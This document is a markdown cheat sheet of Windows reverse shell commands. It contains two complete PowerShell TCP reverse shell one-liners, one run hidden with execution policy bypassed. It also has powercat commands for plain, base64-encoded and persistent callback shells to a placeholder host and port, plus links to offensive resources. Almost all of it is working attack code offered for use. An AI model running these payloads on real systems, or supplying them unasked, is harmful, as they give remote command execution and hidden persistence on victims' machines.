# Powershell

## 01 - Regular

```powershell
PS C:\> $client = New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()

C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()
```

## 02 - Powercat

Generate reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -g
```

Generate base64 encoded reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -ge
```

Persist callback shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -rep
```

---
## References

- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

- [Powercat](https://github.com/besimorhino/powercat)

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)

- [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)